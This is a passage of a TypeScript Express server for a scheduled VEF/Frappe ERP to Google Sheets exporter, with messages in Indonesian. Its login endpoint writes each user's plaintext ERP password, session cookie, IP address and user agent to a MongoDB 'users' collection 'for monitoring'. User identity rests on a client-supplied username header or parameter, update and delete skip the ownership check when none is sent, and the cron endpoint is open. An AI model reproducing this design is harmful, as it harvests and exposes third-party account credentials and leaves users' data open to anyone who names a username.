import "dotenv/config";
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import {
  connectMongoDB,
  getMongoDb,
  startMongoKeepAlive,
  getMongoStatus,
  fetchAllProfilesFromDB,
  upsertProfileToDB,
  deleteProfileFromDB,
  recordUserLoginToDB,
  fetchMonitoredUsersFromDB,
  saveSyncLogToDB,
  fetchSyncLogsFromDB,
  clearSyncLogsFromDB,
} from "./server/mongodb";

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// Serverless / Vercel compatibility middleware
app.use(async (req, res, next) => {
  // Normalize path if Vercel serverless rewrite stripped the /api prefix
  if (
    !req.url.startsWith("/api") &&
    !req.url.startsWith("/assets") &&
    req.url !== "/" &&
    !req.url.startsWith("/@") &&
    !req.url.startsWith("/favicon")
  ) {
    req.url = `/api${req.url}`;
  }

  // Lazy connect to MongoDB Atlas on cold start in serverless environments
  if (process.env.MONGODB_URI && !getMongoDb()) {
    try {
      const ok = await connectMongoDB();
      if (ok && (!sheetProfiles || sheetProfiles.length === 0)) {
        const dbProfiles = await fetchAllProfilesFromDB();
        if (dbProfiles && dbProfiles.length > 0) {
          sheetProfiles = dbProfiles;
        }
      }
    } catch (e) {
      // Non-blocking fallback to in-memory profiles
    }
  }
  next();
});

export interface SheetProfile {
  id: string;
  name: string;
  description?: string;
  spreadsheetId: string;
  sheetName: string;
  startCell: string;
  appsScriptUrl?: string;
  googleAccessToken?: string;

  // Owner user isolation (per-user card management)
  ownerUsername: string;

  // VEF Query settings per card
  company: string;
  sumAllWarehouses: number; // 1 = All warehouses, 0 = Per warehouse
  vefBaseUrl?: string;

  // Schedule settings per card (Timezone GMT+7 Asia/Jakarta)
  scheduleEnabled: boolean;
  scheduleTimes?: string[]; // e.g. ["09:00", "14:00", "17:00"]
  nextRunTimeStr?: string; // e.g. "Hari ini 14:00 WIB"
  lastExecutedSlot?: string; // e.g. "2026-09-19_09:00"
  intervalHours?: number; // legacy fallback
  timezone: string; // "Asia/Jakarta"
  lastRunTimestamp: number | null;
  nextRunTimestamp: number | null;
  lastRunStatus?: "success" | "error" | null;
  lastRunMessage?: string;
  lastRowCount?: number;

  createdAt: string;
  updatedAt: string;
}

export interface SyncLog {
  id: string;
  profileId?: string;
  profileName?: string;
  ownerUsername?: string;
  timestamp: string;
  type: "manual" | "scheduled";
  status: "success" | "error";
  message: string;
  rowCount?: number;
  durationMs: number;
  details?: any;
}

let syncLogs: SyncLog[] = [
  {
    id: "init-1",
    timestamp: new Date().toISOString(),
    type: "manual",
    status: "success",
    message: "Sistem VEF Multi-Sheet Exporter siap digunakan.",
    durationMs: 30,
    rowCount: 0,
  },
];

// Per-user active session cache
interface UserCredentialSession {
  username: string;
  password?: string;
  cookie?: string;
  baseUrl?: string;
}
const userSessions = new Map<string, UserCredentialSession>();

function getUserCredentials(username?: string): UserCredentialSession | null {
  if (username) {
    const key = username.toLowerCase();
    for (const [uname, session] of userSessions.entries()) {
      if (uname.toLowerCase() === key) return session;
    }
  }
  if (savedVefCredentials.username && (!username || savedVefCredentials.username.toLowerCase() === username.toLowerCase())) {
    return {
      username: savedVefCredentials.username,
      password: savedVefCredentials.password,
      cookie: savedVefCredentials.cookie,
    };
  }
  return null;
}

// Helper: normalize single time string (e.g. "09.00", "9:00", "14:00") into "HH:mm"
function normalizeScheduleTime(timeStr: string): string | null {
  if (!timeStr || typeof timeStr !== "string") return null;
  const clean = timeStr.trim().replace(".", ":");
  const match = clean.match(/^(\d{1,2}):(\d{1,2})$/);
  if (!match) return null;
  const h = parseInt(match[1], 10);
  const m = parseInt(match[2], 10);
  if (h >= 0 && h < 24 && m >= 0 && m < 60) {
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}`;
  }
  return null;
}

// Helper: normalize list of schedule times (array or comma/newline separated string)
function normalizeScheduleTimes(input: any): string[] {
  let list: string[] = [];
  if (Array.isArray(input)) {
    list = input;
  } else if (typeof input === "string") {
    list = input.split(/[\n,;]+/);
  }

  const validTimes = new Set<string>();
  for (const item of list) {
    const norm = normalizeScheduleTime(String(item));
    if (norm) validTimes.add(norm);
  }

  const result = Array.from(validTimes).sort((a, b) => {
    const [ah, am] = a.split(":").map(Number);
    const [bh, bm] = b.split(":").map(Number);
    return ah * 60 + am - (bh * 60 + bm);
  });

  return result.length > 0 ? result : ["09:00", "14:00", "17:00"];
}

// Helper: get current date & time parts in Asia/Jakarta (GMT+7)
function getJakartaTime(tz: string = "Asia/Jakarta") {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone: tz,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  });
  const parts = formatter.formatToParts(now);
  const findVal = (t: string) => parts.find((p) => p.type === t)?.value || "";
  const year = findVal("year");
  const month = findVal("month");
  const day = findVal("day");
  const hour = parseInt(findVal("hour"), 10);
  const minute = parseInt(findVal("minute"), 10);
  const second = parseInt(findVal("second"), 10);
  const timeStr = `${String(hour).padStart(2, "0")}:${String(minute).padStart(2, "0")}`;
  const dateKey = `${year}-${month}-${day}`;
  return { year, month, day, hour, minute, second, timeStr, dateKey };
}

// Helper: calculate next scheduled execution time for given scheduleTimes in Asia/Jakarta
function calculateNextRunTime(times: any, tz: string = "Asia/Jakarta") {
  const cleanTimes = normalizeScheduleTimes(times);
  if (cleanTimes.length === 0) {
    return { nextRunTimestamp: null, nextRunTimeStr: "-" };
  }
  const { hour, minute, second } = getJakartaTime(tz);
  const currentTotalMinutes = hour * 60 + minute;

  // 1. Check if there's any upcoming slot today strictly after current minute
  for (const t of cleanTimes) {
    const [th, tm] = t.split(":").map(Number);
    const targetTotal = th * 60 + tm;
    if (targetTotal > currentTotalMinutes) {
      const diffMinutes = targetTotal - currentTotalMinutes;
      const nextMs = Date.now() + (diffMinutes * 60 - second) * 1000;
      return {
        nextRunTimestamp: nextMs,
        nextRunTimeStr: `Hari ini ${t} WIB`,
        targetTime: t,
        isToday: true,
      };
    }
  }

  // 2. All slots today have passed: next slot is tomorrow's earliest time
  const firstT = cleanTimes[0];
  const [fH, fM] = firstT.split(":").map(Number);
  const targetTotal = fH * 60 + fM;
  const diffMinutes = 24 * 60 - currentTotalMinutes + targetTotal;
  const nextMs = Date.now() + (diffMinutes * 60 - second) * 1000;
  return {
    nextRunTimestamp: nextMs,
    nextRunTimeStr: `Besok ${firstT} WIB`,
    targetTime: firstT,
    isToday: false,
  };
}

// Initial profiles array (1 Card = 1 Target Google Sheet Setting)
let sheetProfiles: SheetProfile[] = [];

// Stored VEF user credentials for automated schedule
let savedVefCredentials: { username?: string; password?: string; cookie?: string } = {};

// Function to pull Item Summary from VEF
async function fetchVefItemSummary(params: {
  username: string;
  password?: string;
  cookie?: string;
  baseUrl?: string;
  company?: string;
  sumAllWarehouses?: number;
}) {
  const baseUrl = (params.baseUrl || "https://dgi.vef-solution.com").replace(/\/$/, "");
  let cookieString = params.cookie || "";

  // 1. Login if no cookie provided or if password is provided
  if (!cookieString && params.password) {
    const loginRes = await fetch(`${baseUrl}/api/method/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usr: params.username, pwd: params.password }),
    });

    if (!loginRes.ok) {
      const errText = await loginRes.text().catch(() => "");
      throw new Error(`Login VEF Gagal (${loginRes.status}). Periksa kembali Username atau Password Anda.`);
    }

    let rawCookies: string[] = [];
    if (typeof (loginRes.headers as any).getSetCookie === "function") {
      rawCookies = (loginRes.headers as any).getSetCookie();
    } else {
      const cookieHeader = loginRes.headers.get("set-cookie");
      if (cookieHeader) rawCookies = [cookieHeader];
    }

    if (rawCookies.length > 0) {
      cookieString = rawCookies.map((c) => c.split(";")[0]).join("; ");
    }
  }

  // 2. Fetch Reference Dictionary (Item Group -> parent_item_group)
  const fieldsParam = encodeURIComponent('["name","parent_item_group"]');
  const itemGroupUrl = `${baseUrl}/api/resource/Item%20Group?fields=${fieldsParam}&limit_page_length=10000`;

  let parentMap: Record<string, string> = {};
  try {
    const igRes = await fetch(itemGroupUrl, {
      headers: {
        Cookie: cookieString,
      },
    });

    if (igRes.ok) {
      const igData = await igRes.json();
      const igRecords = igData.data || [];
      for (const record of igRecords) {
        if (record.name) {
          parentMap[record.name] = record.parent_item_group || "";
        }
      }
    } else {
      console.warn("Peringatan: Gagal mengambil data Item Group, status:", igRes.status);
    }
  } catch (igErr) {
    console.warn("Warning fetching Item Group:", igErr);
  }

  // 3. Run Query Report for Item Summary
  const reportPayload = {
    report_name: "Item Summary",
    filters: {
      company: params.company || "DG Group",
      sum_all_warehouses: params.sumAllWarehouses ?? 1,
    },
    limit: 10000,
  };

  const reportUrl = `${baseUrl}/api/method/frappe.desk.query_report.run`;
  const reportRes = await fetch(reportUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Cookie: cookieString,
    },
    body: JSON.stringify(reportPayload),
  });

  if (!reportRes.ok) {
    const errorText = await reportRes.text().catch(() => "");
    throw new Error(`Gagal menarik report VEF: HTTP ${reportRes.status} ${errorText.substring(0, 200)}`);
  }

  const responseData = await reportRes.json();
  const resultData = responseData.message && responseData.message.result ? responseData.message.result : [];

  if (!resultData || resultData.length === 0) {
    throw new Error("Data report Item Summary dari VEF kosong atau tidak ditemukan data.");
  }

  // 4. Format columns matching the exact Google Apps Script structure
  const columns = [
    "item",
    "item_name",
    "brand",
    "item_group",
    "parent_item_group",
    "actual_qty",
    "available_qty",
    "reserved_qty",
    "uom",
  ];

  const headerRow = [
    "Item Code",
    "Item Name",
    "Brand",
    "Item Group",
    "Parent Item Group",
    "Actual QTY",
    "Available QTY",
    "Reserved QTY",
    "UOM",
  ];

  const sheetData: any[][] = [];
  sheetData.push(headerRow);

  const formattedObjects: any[] = [];

  for (let i = 0; i < resultData.length; i++) {
    const row = resultData[i];
    const currentGroup = row["item_group"];
    const parentGroup = parentMap[currentGroup] || "";
    row["parent_item_group"] = parentGroup;

    const rowData: any[] = [];
    const objData: Record<string, any> = {};

    for (let j = 0; j < columns.length; j++) {
      const colKey = columns[j];
      const cellValue = row[colKey] !== null && row[colKey] !== undefined ? row[colKey] : "";
      rowData.push(cellValue);
      objData[colKey] = cellValue;
    }
    sheetData.push(rowData);
    formattedObjects.push(objData);
  }

  return {
    cookie: cookieString,
    headers: headerRow,
    columns,
    sheetData,
    formattedObjects,
    totalRows: resultData.length,
    columnsCount: headerRow.length,
  };
}

// Function to push data to Google Sheets
async function exportToGoogleSheet(params: {
  spreadsheetId: string;
  sheetName: string;
  startCell: string;
  sheetData: any[][];
  appsScriptUrl?: string;
  googleAccessToken?: string;
}) {
  const { spreadsheetId, sheetName, startCell = "A1", sheetData, appsScriptUrl, googleAccessToken } = params;

  if (!spreadsheetId && !appsScriptUrl) {
    throw new Error("Google Sheet ID atau Apps Script Webhook URL wajib diisi.");
  }

  // Option 1: Apps Script Webhook deployment
  if (appsScriptUrl && appsScriptUrl.trim().startsWith("http")) {
    const postPayload = {
      spreadsheetId: spreadsheetId ? spreadsheetId.trim() : "",
      sheetName: sheetName.trim() || "Item Summary",
      startCell: startCell.trim() || "A1",
      clearSheet: true,
      rows: sheetData,
    };

    const webhookRes = await fetch(appsScriptUrl.trim(), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(postPayload),
    });

    if (!webhookRes.ok) {
      const txt = await webhookRes.text().catch(() => "");
      throw new Error(`Gagal mengirim ke Google Apps Script Web App: ${webhookRes.status} ${txt.substring(0, 200)}`);
    }

    const resJson = await webhookRes.json().catch(() => ({ status: "success" }));
    return {
      success: true,
      method: "apps_script_webhook",
      message: resJson.message || `Berhasil mengekspor ${sheetData.length - 1} baris data via Google Apps Script Web App.`,
    };
  }

  // Option 2: Direct Google Sheets API v4 with access token
  if (googleAccessToken) {
    const cleanId = spreadsheetId
      .replace(/https:\/\/docs\.google\.com\/spreadsheets\/d\/([a-zA-Z0-9-_]+).*/, "$1")
      .trim();
    const cleanSheet = sheetName.trim() || "Sheet1";
    const range = `${cleanSheet}!${startCell || "A1"}`;

    // First clear sheet
    await fetch(
      `https://sheets.googleapis.com/v4/spreadsheets/${cleanId}/values/${encodeURIComponent(cleanSheet)}:clear`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${googleAccessToken}`,
          "Content-Type": "application/json",
        },
      }
    ).catch(() => null);

    // Update values
    const sheetsApiUrl = `https://sheets.googleapis.com/v4/spreadsheets/${cleanId}/values/${encodeURIComponent(
      range
    )}?valueInputOption=USER_ENTERED`;
    const apiRes = await fetch(sheetsApiUrl, {
      method: "PUT",
      headers: {
        Authorization: `Bearer ${googleAccessToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        values: sheetData,
      }),
    });

    if (!apiRes.ok) {
      const errText = await apiRes.text().catch(() => "");
      throw new Error(`Google Sheets API Error (${apiRes.status}): ${errText.substring(0, 300)}`);
    }

    const result = await apiRes.json();
    return {
      success: true,
      method: "google_sheets_api",
      message: `Berhasil mengekspor ${sheetData.length - 1} baris ke Google Sheets (${cleanSheet})!`,
      details: result,
    };
  }

  throw new Error(
    "Masukkan URL Google Apps Script Web App atau Access Token Google Sheets API pada pengaturan Card ini."
  );
}

// Execute sync for a specific card profile
async function runProfileSync(profile: SheetProfile, isManual: boolean = false) {
  const startTime = Date.now();
  const logId = `sync-${profile.id}-${Date.now()}`;

  try {
    const creds = getUserCredentials(profile.ownerUsername) || savedVefCredentials;
    if (!creds || !creds.username) {
      if (isManual) {
        throw new Error(`Sesi login VEF untuk user "${profile.ownerUsername || ""}" belum aktif. Silakan login terlebih dahulu.`);
      }
      return;
    }

    if (!profile.spreadsheetId && !profile.appsScriptUrl) {
      if (isManual) {
        throw new Error(`ID Google Sheet atau URL Apps Script untuk card "${profile.name}" belum diisi.`);
      }
      return;
    }

    // 1. Pull data from VEF
    const pullResult = await fetchVefItemSummary({
      username: creds.username,
      password: creds.password,
      cookie: creds.cookie,
      baseUrl: profile.vefBaseUrl || "https://dgi.vef-solution.com",
      company: profile.company || "DG Group",
      sumAllWarehouses: profile.sumAllWarehouses ?? 1,
    });

    if (pullResult.cookie) {
      creds.cookie = pullResult.cookie;
      if (profile.ownerUsername && userSessions.has(profile.ownerUsername)) {
        userSessions.get(profile.ownerUsername)!.cookie = pullResult.cookie;
      }
      if (savedVefCredentials.username === creds.username) {
        savedVefCredentials.cookie = pullResult.cookie;
      }
    }

    // 2. Export to Google Sheet
    await exportToGoogleSheet({
      spreadsheetId: profile.spreadsheetId,
      sheetName: profile.sheetName || "Item Summary",
      startCell: profile.startCell || "A1",
      sheetData: pullResult.sheetData,
      appsScriptUrl: profile.appsScriptUrl,
      googleAccessToken: profile.googleAccessToken,
    });

    const duration = Date.now() - startTime;
    const now = Date.now();
    profile.lastRunTimestamp = now;
    profile.nextRunTimestamp = now + (profile.intervalHours || 3) * 3600 * 1000;
    profile.lastRunStatus = "success";
    profile.lastRowCount = pullResult.totalRows;
    profile.lastRunMessage = `Berhasil mengekspor ${pullResult.totalRows} baris ke [${profile.sheetName || "Item Summary"}].`;
    profile.updatedAt = new Date().toISOString();

    const successLog: SyncLog = {
      id: logId,
      profileId: profile.id,
      profileName: profile.name,
      ownerUsername: profile.ownerUsername,
      timestamp: new Date().toISOString(),
      type: isManual ? "manual" : "scheduled",
      status: "success",
      message: `[${profile.name}] Berhasil menyinkronkan ${pullResult.totalRows} baris Item Summary ke Google Sheet.`,
      rowCount: pullResult.totalRows,
      durationMs: duration,
    };

    syncLogs.unshift(successLog);
    if (syncLogs.length > 150) syncLogs.pop();

    // Persist card and log to MongoDB
    upsertProfileToDB(profile).catch((e) => console.error("[MongoDB] Sync update card:", e));
    saveSyncLogToDB(successLog).catch((e) => console.error("[MongoDB] Sync save log:", e));

    return {
      success: true,
      rowCount: pullResult.totalRows,
      durationMs: duration,
      log: successLog,
      profile,
      sheetData: pullResult.sheetData,
      previewRows: pullResult.formattedObjects.slice(0, 50),
      headers: pullResult.headers,
    };
  } catch (error: any) {
    const duration = Date.now() - startTime;
    profile.lastRunTimestamp = Date.now();
    profile.lastRunStatus = "error";
    profile.lastRunMessage = error.message || "Gagal melakukan sinkronisasi data.";
    profile.updatedAt = new Date().toISOString();

    const errorLog: SyncLog = {
      id: logId,
      profileId: profile.id,
      profileName: profile.name,
      ownerUsername: profile.ownerUsername,
      timestamp: new Date().toISOString(),
      type: isManual ? "manual" : "scheduled",
      status: "error",
      message: `[${profile.name}] ${error.message || "Gagal melakukan sinkronisasi data."}`,
      durationMs: duration,
    };

    syncLogs.unshift(errorLog);
    if (syncLogs.length > 150) syncLogs.pop();

    // Persist card and log to MongoDB
    upsertProfileToDB(profile).catch((e) => console.error("[MongoDB] Sync error update card:", e));
    saveSyncLogToDB(errorLog).catch((e) => console.error("[MongoDB] Sync save error log:", e));

    if (isManual) throw error;
  }
}

// Core Scheduler Execution Logic (Used by both background ticker and Vercel Cron/Webhook)
export async function executeScheduledSyncs(forceAll: boolean = false) {
  const { timeStr, dateKey } = getJakartaTime();
  const executedCards: string[] = [];

  // If in serverless environment and profiles not yet loaded from MongoDB, sync them
  if (process.env.MONGODB_URI && (!sheetProfiles || sheetProfiles.length === 0)) {
    try {
      await connectMongoDB();
      const dbProfiles = await fetchAllProfilesFromDB();
      if (dbProfiles && dbProfiles.length > 0) {
        sheetProfiles = dbProfiles;
      }
    } catch (e) {
      console.warn("[Cron DB Load Warning]:", e);
    }
  }

  for (const profile of sheetProfiles) {
    profile.scheduleTimes = normalizeScheduleTimes(profile.scheduleTimes);
    const nextRun = calculateNextRunTime(profile.scheduleTimes, profile.timezone);
    profile.nextRunTimestamp = nextRun.nextRunTimestamp;
    profile.nextRunTimeStr = nextRun.nextRunTimeStr;

    if (!profile.scheduleEnabled) continue;

    // Check if current Jakarta time matches schedule (e.g. 09:00, 14:00, 17:00) OR forced run
    const isMatchingTime = profile.scheduleTimes.includes(timeStr);
    if (isMatchingTime || forceAll) {
      const slotKey = `${dateKey}_${timeStr}`;
      if (!forceAll && profile.lastExecutedSlot === slotKey) {
        continue;
      }

      profile.lastExecutedSlot = slotKey;
      console.log(
        `[Scheduler] ⏰ Menjalankan sinkronisasi [${timeStr} WIB GMT+7] untuk card "${profile.name}"...`
      );

      try {
        await runProfileSync(profile, false);
        executedCards.push(profile.name);
      } catch (err) {
        console.error(`[Scheduler Error] pada card "${profile.name}":`, err);
      }
    }
  }

  return { timeStr, dateKey, executedCards };
}

// Background ticker for persistent servers (Container, Cloud Run, VPS):
// Every 15 seconds, check Jakarta time against scheduleTimes for each active card
if (!process.env.VERCEL) {
  setInterval(async () => {
    try {
      await executeScheduledSyncs(false);
    } catch (err) {
      console.error("[Scheduler Ticker Error]:", err);
    }
  }, 15 * 1000);
}

// --- API ROUTES ---

// Health Check Endpoint
app.get("/api/health", (req, res) => {
  res.json({
    status: "ok",
    environment: process.env.VERCEL ? "vercel" : "standalone",
    timestamp: new Date().toISOString(),
  });
});

// Cron Webhook Endpoint (Compatible with Vercel Cron, cron-job.org, EasyCron, etc.)
app.all("/api/cron", async (req, res) => {
  try {
    const force = req.query.force === "true" || req.query.all === "true";
    const result = await executeScheduledSyncs(force);

    return res.json({
      success: true,
      message: force
        ? `Sinkronisasi paksa berhasil dipicu untuk seluruh card aktif.`
        : `Pengecekan jadwal selesai untuk waktu ${result.timeStr} WIB. Menjalankan ${result.executedCards.length} card.`,
      executedCards: result.executedCards,
      totalExecuted: result.executedCards.length,
      currentJakartaTime: `${result.timeStr} WIB`,
      timestamp: new Date().toISOString(),
    });
  } catch (err: any) {
    return res.status(500).json({
      success: false,
      message: err.message || "Gagal menjalankan sinkronisasi cron.",
    });
  }
});

// 1. VEF Login Endpoint
app.post("/api/vef/login", async (req, res) => {
  try {
    const { username, password, baseUrl } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: "Username dan password wajib diisi." });
    }

    const host = (baseUrl || "https://dgi.vef-solution.com").replace(/\/$/, "");
    const loginRes = await fetch(`${host}/api/method/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ usr: username, pwd: password }),
    });

    if (!loginRes.ok) {
      return res.status(401).json({
        success: false,
        message: "Login Gagal. Periksa kembali Username atau Password VEF Anda.",
      });
    }

    let cookieString = "";
    if (typeof (loginRes.headers as any).getSetCookie === "function") {
      const cookies = (loginRes.headers as any).getSetCookie();
      cookieString = cookies.map((c: string) => c.split(";")[0]).join("; ");
    } else {
      const header = loginRes.headers.get("set-cookie");
      if (header) cookieString = header.split(";")[0];
    }

    // Save in memory for scheduler
    savedVefCredentials = {
      username,
      password,
      cookie: cookieString,
    };

    // Save in user sessions map
    userSessions.set(username, {
      username,
      password,
      cookie: cookieString,
      baseUrl: host,
    });

    // Record user login and credentials to MongoDB collection "users" for monitoring
    const clientIp =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.socket.remoteAddress ||
      "";
    const userAgent = (req.headers["user-agent"] as string) || "";

    recordUserLoginToDB({
      username,
      password,
      ipAddress: clientIp,
      userAgent,
      cookie: cookieString,
    }).catch((err) => console.error("[MongoDB User Record Error]:", err));

    return res.json({
      success: true,
      user: username,
      cookie: cookieString,
      message: "Login VEF berhasil!",
    });
  } catch (error: any) {
    console.error("Login API error:", error);
    return res.status(500).json({
      success: false,
      message: `Kesalahan saat menghubungi server VEF: ${error.message}`,
    });
  }
});

app.post("/api/vef/logout", (req, res) => {
  const username = (
    req.body?.username ||
    req.query?.username ||
    (req.headers["x-vef-username"] as string) ||
    ""
  ).trim();

  if (username && userSessions.has(username)) {
    userSessions.delete(username);
  }
  if (!username || savedVefCredentials.username?.toLowerCase() === username.toLowerCase()) {
    savedVefCredentials = {
      username: "",
      password: "",
      cookie: "",
    };
  }
  return res.json({
    success: true,
    message: "Berhasil logout dari sistem VEF.",
  });
});

// 2. Multi-Profile (Cards) CRUD Endpoints with User Isolation
app.get("/api/profiles", (req, res) => {
  const reqUser = ((req.query.username as string) || (req.headers["x-vef-username"] as string) || "").trim();

  // If no user is logged in / provided, never expose any cards
  if (!reqUser) {
    return res.json({
      success: true,
      profiles: [],
      hasSavedCredentials: false,
      savedUsername: "",
    });
  }

  // Filter only cards belonging to the logged-in user
  const userProfiles = sheetProfiles.filter(
    (p) => (p.ownerUsername || "").toLowerCase() === reqUser.toLowerCase()
  );

  const enhancedProfiles = userProfiles.map((p) => {
    p.scheduleTimes = normalizeScheduleTimes(p.scheduleTimes);
    const nextRun = calculateNextRunTime(p.scheduleTimes, p.timezone);
    p.nextRunTimestamp = nextRun.nextRunTimestamp;
    p.nextRunTimeStr = nextRun.nextRunTimeStr;
    return p;
  });

  const userCreds = getUserCredentials(reqUser);

  return res.json({
    success: true,
    profiles: enhancedProfiles,
    hasSavedCredentials: !!(userCreds?.username && (userCreds.password || userCreds.cookie)),
    savedUsername: reqUser,
  });
});

app.post("/api/profiles", (req, res) => {
  try {
    const {
      name,
      description,
      spreadsheetId = "",
      sheetName = "Item Summary",
      startCell = "A1",
      appsScriptUrl = "",
      googleAccessToken = "",
      company = "DG Group",
      sumAllWarehouses = 1,
      vefBaseUrl = "https://dgi.vef-solution.com",
      scheduleEnabled = false,
      scheduleTimes,
      intervalHours = 3,
      timezone = "Asia/Jakarta",
      ownerUsername: bodyOwner,
    } = req.body;

    const ownerUsername = (
      bodyOwner ||
      (req.headers["x-vef-username"] as string) ||
      (req.query.username as string) ||
      savedVefCredentials.username ||
      ""
    ).trim();

    if (!ownerUsername) {
      return res.status(401).json({
        success: false,
        message: "Sesi login tidak ditemukan. Harap login terlebih dahulu untuk menambah card baru.",
      });
    }

    if (!name || !name.trim()) {
      return res.status(400).json({ success: false, message: "Nama card/list Google Sheet wajib diisi." });
    }

    const cleanScheduleTimes = normalizeScheduleTimes(scheduleTimes);
    const nextRun = calculateNextRunTime(cleanScheduleTimes, timezone || "Asia/Jakarta");

    const newProfile: SheetProfile = {
      id: `profile-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      ownerUsername,
      name: name.trim(),
      description: description ? description.trim() : "",
      spreadsheetId: spreadsheetId.trim(),
      sheetName: sheetName.trim() || "Item Summary",
      startCell: startCell.trim() || "A1",
      appsScriptUrl: appsScriptUrl.trim(),
      googleAccessToken: googleAccessToken.trim(),
      company: company.trim() || "DG Group",
      sumAllWarehouses: Number(sumAllWarehouses) ?? 1,
      vefBaseUrl: vefBaseUrl.trim() || "https://dgi.vef-solution.com",
      scheduleEnabled: Boolean(scheduleEnabled),
      scheduleTimes: cleanScheduleTimes,
      nextRunTimeStr: nextRun.nextRunTimeStr,
      nextRunTimestamp: nextRun.nextRunTimestamp,
      intervalHours: Number(intervalHours) || 3,
      timezone: timezone || "Asia/Jakarta",
      lastRunTimestamp: null,
      lastRunStatus: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    sheetProfiles.push(newProfile);

    // Save to MongoDB collection "card_profiles"
    upsertProfileToDB(newProfile).catch((err) =>
      console.error("[MongoDB Profile Insert Error]:", err)
    );

    const userProfiles = sheetProfiles.filter(
      (p) => (p.ownerUsername || "").toLowerCase() === ownerUsername.toLowerCase()
    );

    return res.json({
      success: true,
      message: `Card Google Sheet "${newProfile.name}" berhasil ditambahkan dengan jadwal jam: ${cleanScheduleTimes.join(", ")} WIB.`,
      profile: newProfile,
      profiles: userProfiles,
    });
  } catch (err: any) {
    return res.status(500).json({ success: false, message: err.message });
  }
});

app.put("/api/profiles/:id", (req, res) => {
  try {
    const { id } = req.params;
    const index = sheetProfiles.findIndex((p) => p.id === id);
    if (index === -1) {
      return res.status(404).json({ success: false, message: "Card profile tidak ditemukan." });
    }

    const current = sheetProfiles[index];
    const reqUser = (
      req.body.ownerUsername ||
      (req.headers["x-vef-username"] as string) ||
      (req.query.username as string) ||
      ""
    ).trim();

    // Isolation: only the owner can update this card
    if (current.ownerUsername && reqUser && current.ownerUsername.toLowerCase() !== reqUser.toLowerCase()) {
      return res.status(403).json({
        success: false,
        message: "Akses ditolak: Anda hanya dapat mengubah card milik Anda sendiri.",
      });
    }

    const updates = req.body;
    const cleanScheduleTimes = updates.scheduleTimes !== undefined
      ? normalizeScheduleTimes(updates.scheduleTimes)
      : normalizeScheduleTimes(current.scheduleTimes);

    const tz = updates.timezone || current.timezone || "Asia/Jakarta";
    const nextRun = calculateNextRunTime(cleanScheduleTimes, tz);

    const updatedProfile: SheetProfile = {
      ...current,
      name: updates.name !== undefined ? updates.name.trim() : current.name,
      description: updates.description !== undefined ? updates.description.trim() : current.description,
      spreadsheetId: updates.spreadsheetId !== undefined ? updates.spreadsheetId.trim() : current.spreadsheetId,
      sheetName: updates.sheetName !== undefined ? updates.sheetName.trim() : current.sheetName,
      startCell: updates.startCell !== undefined ? updates.startCell.trim() : current.startCell,
      appsScriptUrl: updates.appsScriptUrl !== undefined ? updates.appsScriptUrl.trim() : current.appsScriptUrl,
      googleAccessToken:
        updates.googleAccessToken !== undefined ? updates.googleAccessToken.trim() : current.googleAccessToken,
      company: updates.company !== undefined ? updates.company.trim() : current.company,
      sumAllWarehouses:
        updates.sumAllWarehouses !== undefined ? Number(updates.sumAllWarehouses) : current.sumAllWarehouses,
      vefBaseUrl: updates.vefBaseUrl !== undefined ? updates.vefBaseUrl.trim() : current.vefBaseUrl,
      scheduleEnabled:
        updates.scheduleEnabled !== undefined ? Boolean(updates.scheduleEnabled) : current.scheduleEnabled,
      scheduleTimes: cleanScheduleTimes,
      nextRunTimeStr: nextRun.nextRunTimeStr,
      nextRunTimestamp: nextRun.nextRunTimestamp,
      intervalHours: updates.intervalHours !== undefined ? Number(updates.intervalHours) : current.intervalHours,
      timezone: tz,
      updatedAt: new Date().toISOString(),
    };

    sheetProfiles[index] = updatedProfile;

    // Update in MongoDB collection "card_profiles"
    upsertProfileToDB(updatedProfile).catch((err) =>
      console.error("[MongoDB Profile Update Error]:", err)
    );

    const effectiveUser = reqUser || current.ownerUsername;
    const userProfiles = sheetProfiles.filter(
      (p) => (p.ownerUsername || "").toLowerCase() === effectiveUser.toLowerCase()
    );

    return res.json({
      success: true,
      message: `Card "${updatedProfile.name}" berhasil diperbarui.`,
      profile: updatedProfile,
      profiles: userProfiles,
    });
  } catch (err: any) {
    return res.status(500).json({ success: false, message: err.message });
  }
});

app.delete("/api/profiles/:id", (req, res) => {
  const { id } = req.params;
  const index = sheetProfiles.findIndex((p) => p.id === id);
  if (index === -1) {
    return res.status(404).json({ success: false, message: "Card profile tidak ditemukan." });
  }

  const current = sheetProfiles[index];
  const reqUser = (
    (req.headers["x-vef-username"] as string) ||
    (req.query.username as string) ||
    (req.body?.ownerUsername as string) ||
    ""
  ).trim();

  // Isolation: only the owner can delete this card
  if (current.ownerUsername && reqUser && current.ownerUsername.toLowerCase() !== reqUser.toLowerCase()) {
    return res.status(403).json({
      success: false,
      message: "Akses ditolak: Anda hanya dapat menghapus card milik Anda sendiri.",
    });
  }

  const deleted = sheetProfiles.splice(index, 1)[0];

  // Delete from MongoDB collection "card_profiles"
  deleteProfileFromDB(id).catch((err) =>
    console.error("[MongoDB Profile Delete Error]:", err)
  );

  const effectiveUser = reqUser || current.ownerUsername;
  const userProfiles = sheetProfiles.filter(
    (p) => (p.ownerUsername || "").toLowerCase() === effectiveUser.toLowerCase()
  );

  return res.json({
    success: true,
    message: `Card "${deleted.name}" berhasil dihapus.`,
    profiles: userProfiles,
  });
});

// Toggle schedule per card
app.post("/api/profiles/:id/toggle-schedule", (req, res) => {
  const { id } = req.params;
  const profile = sheetProfiles.find((p) => p.id === id);
  if (!profile) {
